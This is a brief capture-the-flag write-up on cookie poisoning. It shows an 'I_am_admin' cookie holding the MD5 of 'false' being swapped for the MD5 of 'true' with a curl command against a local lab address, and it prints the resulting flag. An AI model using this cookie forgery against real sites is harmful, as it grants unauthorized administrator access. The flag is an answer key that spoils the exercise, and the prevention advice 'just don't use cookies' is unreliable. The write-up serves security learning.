# Cookie poisoning
Cookie poisoning is the modification of a cookie by an attacker to gain unauthorized information.

### Step 1
Navigate to http://0.0.0.0/index.php
> * Inspect page and find the header section
> * Find **cookie: _I_am_admin=68934a3e9455fa72420237eb05902327_**  

### Step 2
> * md5 decrypt: 68934a3e9455fa72420237eb05902327 => false
> * md5 encrypt : true => b326b5062b2f0e69046810717534cb09

### Step 3
> * Attack: Use cURL to modify the cookie section within the header with new md5 encoded string
> 1. curl -b 'I_am_admin=b326b5062b2f0e69046810717534cb09' http://0.0.0.0/index.php | grep 'Flag'
> 2. **THE FLAG IS : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3**

https://searchsecurity.techtarget.com/definition/cookie-poisoning

https://catonmat.net/cookbooks/curl/set-cookies

https://www.md5online.org/md5-decrypt.html

## Prevention
> * Just don't use cookies
> * https://www.webdesignerdepot.com/2019/06/does-the-web-really-need-cookies/
> * https://www.venafi.com/blog/what-are-cookie-poisoning-attacks-0
